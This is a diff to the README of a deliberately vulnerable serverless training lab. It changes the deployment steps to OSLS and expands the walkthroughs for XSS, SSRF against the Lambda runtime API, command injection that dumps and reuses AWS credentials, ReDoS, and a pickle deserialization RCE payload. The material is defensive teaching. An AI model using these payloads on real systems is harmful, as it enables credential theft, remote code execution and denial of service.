@@ -17,7 +17,7 @@
 
 <p align="center">
   A deliberately vulnerable serverless application for learning AWS Lambda security testing.<br/>
-  Maps to the <b>OWASP Serverless Top 10</b>.
+  Maps to the <b>OWASP Serverless Top 10</b>. Deploy with <a href="https://github.com/oss-serverless/osls">OSLS</a> (open-source Serverless Framework — no licensing or dashboard sign-up required).
 </p>
 
 > [!WARNING]
@@ -61,9 +61,7 @@
 - **AWS CLI** configured with credentials: `aws configure`
 - **Python 3.12+**
 - **Node.js 18+**
-- **Serverless Framework v4**: `npm install -g serverless`
-- **Serverless Dashboard account**: `serverless login` (required for v4)
-- **httpie** (optional): [httpie.io/cli](https://httpie.io/cli)
+- **OSLS** (open-source Serverless Framework): `npm install -g osls`
 
 ---
 
@@ -75,74 +73,210 @@
     cd very-vulnerable-serverless
     ```
 
-2. **Install dependencies:**
+2. **Install plugin dependencies:**
     ```bash
     npm install
     ```
 
-3. **Login to Serverless Dashboard (first time only):**
+3. **Deploy to AWS:**
     ```bash
-    serverless login
+    osls deploy
+    ```
+    The output prints the API Gateway endpoint URL. Save it — you will need it for every attack below.
+
+    Example output:
+    ```
+    endpoints:
+      ANY - https://xxxxxxxxxx.execute-api.us-east-1.amazonaws.com
     ```
 
-4. **Deploy:**
-    ```bash
-    serverless deploy
-    ```
-
-5. **Access the app** at the URL printed in the deploy output.
+4. **Open the app** in your browser at that URL to confirm it is running.
 
 ---
 
 ## Attack Walkthroughs
 
-### XSS / Injection
-```
-Open browser → Enter: "><img src=x onerror=alert('xss')>
-```
+Replace `<endpoint>` with your deployed API Gateway URL in every command below.
 
-### SSRF → Lambda Runtime
-```bash
-curl https://<endpoint>/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
-```
+---
 
-### Command Injection → Credential Theft
-```bash
-# Execute arbitrary commands
-curl "https://<endpoint>/date?exec=printenv"
+### 1. Reflected XSS (SLS-1, SLS-7)
 
-# Steal Lambda IAM credentials, then:
-export AWS_ACCESS_KEY_ID=...
-export AWS_SECRET_ACCESS_KEY=...
-export AWS_SESSION_TOKEN=...
-aws sts get-caller-identity
-aws s3 ls
-```
+The `/welcome/<name>` route reflects user input directly into the response without encoding.
 
-### ReDoS
-```bash
-# Normal (fast):
-curl "https://<endpoint>/redos?string=aaaaaab"
+**Steps:**
 
-# Attack (exponential backtracking → timeout/502):
-curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-```
+1. Open your browser and go to:
+    ```
+    https://<endpoint>/welcome/<script>alert(document.cookie)</script>
+    ```
+2. The browser executes the script. You should see an alert box with the page cookies.
 
-### Insecure Deserialization (Pickle RCE)
-```python
-import pickle, base64, requests
+3. Try an image-based payload that bypasses simple `<script>` filters:
+    ```
+    https://<endpoint>/welcome/"><img src=x onerror=alert('XSS')>
+    ```
 
-class PickleRCE:
-    def __reduce__(self):
-        import os
-        return (os.system, ('touch /tmp/hacked',))
+**What to look for:** The input appears unescaped in the HTML response body. No output encoding, no Content-Security-Policy header.
 
-payload = base64.urlsafe_b64encode(pickle.dumps(PickleRCE())).decode()
-requests.post('https://<endpoint>/deserial', data={'pickled': payload})
+---
 
-# Verify:
-requests.get('https://<endpoint>/date?exec=ls -la /tmp/hacked')
-```
+### 2. Injection via Login Form (SLS-1)
+
+The `/login` endpoint accepts both POST and GET and passes the `name` parameter to `/welcome/<name>` without sanitization.
+
+**Steps:**
+
+1. Submit the form on the landing page with the value:
+    ```
+    <script>alert('XSS')</script>
+    ```
+2. Or send it via GET:
+    ```bash
+    curl -v "https://<endpoint>/login?name=<script>alert('XSS')</script>"
+    ```
+3. Follow the redirect — the payload is reflected in the `/welcome/` response.
+
+---
+
+### 3. SSRF → Lambda Runtime Credential Theft (SLS-3)
+
+The `/redirect` endpoint fetches any URL the caller supplies using `urllib.request.urlopen`. Inside a Lambda, the runtime API is accessible on `127.0.0.1:9001`.
+
+**Steps:**
+
+1. Confirm SSRF by fetching an external URL:
+    ```bash
+    curl "https://<endpoint>/redirect?url=https://httpbin.org/ip"
+    ```
+    You should see the Lambda's public IP in the response.
+
+2. Hit the Lambda runtime API to read the next invocation (which leaks environment context):
+    ```bash
+    curl "https://<endpoint>/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"
+    ```
+
+3. Combine with command injection (`/date?exec=printenv`) to read `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` from the Lambda environment.
+
+**What to look for:** No allowlist on the URL parameter. Internal services (runtime API, metadata endpoints) are reachable.
+
+---
+
+### 4. OS Command Injection → AWS Credential Theft (SLS-1, SLS-5, SLS-6)
+
+The `/date` endpoint passes the `exec` query parameter directly to `subprocess.Popen` with `shell=True`. The Lambda's IAM role has `s3:*` on `*`.
+
+**Steps:**
+
+1. Run `id` to confirm code execution:
+    ```bash
+    curl "https://<endpoint>/date?exec=id"
+    ```
+    Expected: `{"output": "uid=993(sbx_user1051) gid=990 groups=990\n"}`
+
+2. Dump environment variables (AWS credentials live here):
+    ```bash
+    curl "https://<endpoint>/date?exec=printenv"
+    ```
+    Look for `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`.
+
+3. Export stolen credentials locally:
+    ```bash
+    export AWS_ACCESS_KEY_ID=ASIA...
+    export AWS_SECRET_ACCESS_KEY=...
+    export AWS_SESSION_TOKEN=...
+    ```
+
+4. Verify identity and enumerate:
+    ```bash
+    aws sts get-caller-identity
+    aws s3 ls
+    ```
+
+5. The role has `s3:*` on `*` — you can list, read, write, and delete any S3 bucket in the account.
+
+**What to look for:** `shell=True` with unsanitized input, overly permissive IAM role (`s3:*` on `Resource: "*"`), credentials in environment variables.
+
+---
+
+### 5. ReDoS — Regular Expression Denial of Service (SLS-10)
+
+The `/redos` endpoint matches user input against the evil regex `^(a+)+b$`, which has catastrophic backtracking on strings of `a` without a trailing `b`.
+
+**Steps:**
+
+1. Normal request (fast):
+    ```bash
+    curl "https://<endpoint>/redos?string=aaaaaab"
+    ```
+    Response time should be near `0:00:00`.
+
+2. Attack request — increase the number of `a` characters:
+    ```bash
+    # ~20 a's — takes a few seconds
+    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaa"
+
+    # ~25 a's — takes much longer
+    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaa"
+
+    # ~30+ a's — Lambda times out (502 Bad Gateway)
+    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    ```
+
+3. Compare response times in the HTML output. Each additional `a` roughly doubles the processing time.
+
+**What to look for:** The response time field grows exponentially. Eventually the Lambda hits its timeout and API Gateway returns 502. This is a CPU-exhaustion denial of service with a single HTTP request.
+
+---
+
+### 6. Insecure Deserialization — Pickle RCE (SLS-4)
+
+The `/deserial` endpoint base64-decodes user input and passes it to `pickle.loads()`, which executes arbitrary Python during deserialization.
+
+**Steps:**
+
+1. Create a malicious pickle payload:
+    ```python
+    import pickle, base64
+
+    class RCE:
+        def __reduce__(self):
+            import os
+            return (os.system, ('touch /tmp/hacked',))
+
+    payload = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
+    print(payload)
+    ```
+
+2. Send it:
+    ```bash
+    curl -X POST "https://<endpoint>/deserial" \
+      -d "pickled=<base64_payload_from_step_1>"
+    ```
+    Expected: `pickled successfully`
+
+3. Verify the file was created using command injection:
+    ```bash
+    curl "https://<endpoint>/date?exec=ls -la /tmp/hacked"
+    ```
+
+4. For a reverse shell or data exfil, modify `__reduce__` to run any shell command. Combined with the overly permissive IAM role, this gives full account access.
+
+**What to look for:** `pickle.loads()` on untrusted input is equivalent to `eval()`. Never deserialize data from users.
+
+---
+
+### 7. Security Misconfiguration (SLS-5, SLS-6)
+
+Review `serverless.yml` for misconfigurations without sending a single request.
+
+**What to look for:**
+
+- `VARIABLE_1: supersecret99` — secrets stored as plaintext environment variables (visible in Lambda console, CloudFormation, and `printenv`)
+- `s3:*` on `Resource: "*"` — Lambda can access every S3 bucket in the account
+- `app.secret_key = 'ThisisSuperFlagBySecurityDojo'` — hardcoded Flask secret in source code
+- No CloudWatch alarms, no X-Ray tracing, no WAF — zero monitoring (SLS-9)
+- Outdated dependencies in `requirements.txt` with known CVEs (SLS-8)
 
 ---
 
@@ -151,10 +285,17 @@ requests.get('https://<endpoint>/date?exec=ls -la /tmp/hacked')
 Remove all deployed AWS resources:
 
 ```bash
-serverless remove
+osls remove
 ```
 
-This deletes the CloudFormation stack, Lambda function, API Gateway, and associated IAM roles.
+This deletes the CloudFormation stack, Lambda function, API Gateway, and associated IAM roles. Verify with:
+
+```bash
+aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE \
+  | grep very-vulnerable-serverless
+```
+
+If no output, the stack is gone.
 
 ---
 
